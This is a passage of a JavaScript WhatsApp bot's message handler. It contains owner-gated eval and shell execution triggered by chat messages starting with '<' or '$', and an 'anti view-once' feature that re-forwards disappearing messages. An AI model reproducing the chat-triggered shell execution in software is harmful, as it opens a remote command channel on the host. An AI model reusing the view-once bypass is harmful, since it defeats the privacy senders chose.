if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('<')) {
if (!isCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('$')){
if (!isCreator) return reply(api.owner)
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.mtype == 'viewOnceMessage') {
if (!global.db.chats[m.chat].antionce) return
teks = `「 *Anti ViewOnce Message* 」

⭔ Nama : ${m.pushName}
⭔ User : @${m.sender.split("@")[0]}
⭔ Clock : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
⭔ Date : ${tanggal(new Date())}
⭔ MessageType : ${m.mtype}`

sock.sendTextWithMentions(m.chat, teks, m)
await sleep(1000)
m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => reply('Mungkin dah pernah dibuka bot'))
}

} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})

process.on('uncaughtException', console.error);
